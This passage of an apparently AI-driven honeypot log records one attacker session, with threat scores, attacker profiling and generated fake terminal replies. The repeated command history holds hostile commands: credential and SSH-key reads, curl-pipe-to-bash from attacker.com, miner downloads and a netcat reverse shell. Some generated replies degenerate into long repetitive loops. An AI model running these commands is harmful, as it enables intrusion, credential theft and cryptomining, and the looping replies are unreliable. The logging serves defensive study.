        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 61,
            "unique_commands": 58,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 713,
            "commands_executed": 61,
            "successful_commands": 55,
            "failed_commands": 6,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 131,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:18:16,944 - {"session_id": "71dd20b2", "command": "chmod 777 /var/www/html/uploads", "attack_type": "Unknown", "risk_score": 131, "threat_level": "CRITICAL"}
2026-07-21 11:18:16,944 - {
    "session_id": "71dd20b2",
    "command": "chmod 777 /var/www/html/uploads",
    "ai_decision": "None",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 61
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 131,
    "threat_level": "CRITICAL"
}
2026-07-21 11:18:16,944 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: chmod 777 /var/www/html/uploads",
    "ai_decision": "None",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:18:17,023 - {
    "session_id": "71dd20b2",
    "query": "nc -lvp 4444",
    "response": "Listening on 0.0.0.0 4444",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 132,
        "risk_level": "CRITICAL",
        "final_score": 132,
        "threat_level": "CRITICAL",
        "base_score": 132,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 62,
            "unique_commands": 59,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 713,
            "commands_executed": 62,
            "successful_commands": 56,
            "failed_commands": 6,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 132,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:18:17,023 - {"session_id": "71dd20b2", "command": "nc -lvp 4444", "attack_type": "Unknown", "risk_score": 132, "threat_level": "CRITICAL"}
2026-07-21 11:18:17,023 - {
    "session_id": "71dd20b2",
    "command": "nc -lvp 4444",
    "ai_decision": "Listening on 0.0.0.0 4444",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 62
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 132,
    "threat_level": "CRITICAL"
}
2026-07-21 11:18:17,024 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: nc -lvp 4444",
    "ai_decision": "Listening on 0.0.0.0 4444",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:18:17,115 - {
    "session_id": "71dd20b2",
    "query": "netcat -e /bin/bash 10.0.0.5 8080",
    "response": "None",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 133,
        "risk_level": "CRITICAL",
        "final_score": 133,
        "threat_level": "CRITICAL",
        "base_score": 133,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 63,
            "unique_commands": 60,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 713,
            "commands_executed": 63,
            "successful_commands": 56,
            "failed_commands": 7,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 133,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:18:17,115 - {"session_id": "71dd20b2", "command": "netcat -e /bin/bash 10.0.0.5 8080", "attack_type": "Unknown", "risk_score": 133, "threat_level": "CRITICAL"}
2026-07-21 11:18:17,115 - {
    "session_id": "71dd20b2",
    "command": "netcat -e /bin/bash 10.0.0.5 8080",
    "ai_decision": "None",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 63
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 133,
    "threat_level": "CRITICAL"
}
2026-07-21 11:18:17,115 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: netcat -e /bin/bash 10.0.0.5 8080",
    "ai_decision": "None",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:18:30,385 - {
    "session_id": "71dd20b2",
    "query": "telnet 10.0.0.1 23",
    "response": "Trying to establish a telnet connection to 10.0.0.1 on port 23...\n\nTrying 10.0.0.1...\ntelnet: Unable to connect to remote host: Connection refused\n\nConnection to 10.0.0.1 port 23 [refused]\n\nAudit Log:\n2026-07-21 14:30:00 - root - prod-restricted-01 - telnet 10.0.0.1 23 - Connection refused - 10.0.0.1 - 23 - root - prod-restricted-01 - 2026-07-21 14:30:00 - 0.000s",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 134,
        "risk_level": "CRITICAL",
        "final_score": 134,
        "threat_level": "CRITICAL",
        "base_score": 134,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 64,
            "unique_commands": 61,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 713,
            "commands_executed": 64,
            "successful_commands": 57,
            "failed_commands": 7,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 134,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:18:30,385 - {"session_id": "71dd20b2", "command": "telnet 10.0.0.1 23", "attack_type": "Unknown", "risk_score": 134, "threat_level": "CRITICAL"}
2026-07-21 11:18:30,387 - {
    "session_id": "71dd20b2",
    "command": "telnet 10.0.0.1 23",
    "ai_decision": "Trying to establish a telnet connection to 10.0.0.1 on port 23...\n\nTrying 10.0.0.1...\ntelnet: Unable to connect to remote host: Connection refused\n\nConnection to 10.0.0.1 port 23 [refused]\n\nAudit Log:\n2026-07-21 14:30:00 - root - prod-restricted-01 - telnet 10.0.0.1 23 - Connection refused - 10.0.0.1 - 23 - root - prod-restricted-01 - 2026-07-21 14:30:00 - 0.000s",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 64
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 134,
    "threat_level": "CRITICAL"
}
2026-07-21 11:18:30,387 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: telnet 10.0.0.1 23",
    "ai_decision": "Trying to establish a telnet connection to 10.0.0.1 on port 23...\n\nTrying 10.0.0.1...\ntelnet: Unable to connect to remote host: Connection refused\n\nConnection to 10.0.0.1 port 23 [refused]\n\nAudit Log:\n2026-07-21 14:30:00 - root - prod-restricted-01 - telnet 10.0.0.1 23 - Connection refused - 10.0.0.1 - 23 - root - prod-restricted-01 - 2026-07-21 14:30:00 - 0.000s",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:18:45,769 - {
    "session_id": "71dd20b2",
    "query": "ssh user@10.0.0.1",
    "response": "Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 135,
        "risk_level": "CRITICAL",
        "final_score": 135,
        "threat_level": "CRITICAL",
        "base_score": 135,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 65,
            "unique_commands": 62,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 726,
            "commands_executed": 65,
            "successful_commands": 57,
            "failed_commands": 8,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 135,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:18:45,769 - {"session_id": "71dd20b2", "command": "ssh user@10.0.0.1", "attack_type": "Unknown", "risk_score": 135, "threat_level": "CRITICAL"}
2026-07-21 11:18:45,769 - {
    "session_id": "71dd20b2",
    "command": "ssh user@10.0.0.1",
    "ai_decision": "Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 65
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 135,
    "threat_level": "CRITICAL"
}
2026-07-21 11:18:45,769 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: ssh user@10.0.0.1",
    "ai_decision": "Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.\n\n[2026-07-21 14:30:00] AUDIT LOG: \nCommand executed: ssh user@10.0.0.1\nUser: root\nUID: 1001\nCWD: /home/ubuntu\nResult: Permission denied (publickey).\nAuthentication failed.\nConnection closed by remote host.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:19:03,354 - {
    "session_id": "71dd20b2",
    "query": "ftp 10.0.0.1",
    "response": "ftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp:",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 136,
        "risk_level": "CRITICAL",
        "final_score": 136,
        "threat_level": "CRITICAL",
        "base_score": 136,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 66,
            "unique_commands": 63,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 742,
            "commands_executed": 66,
            "successful_commands": 58,
            "failed_commands": 8,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 136,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
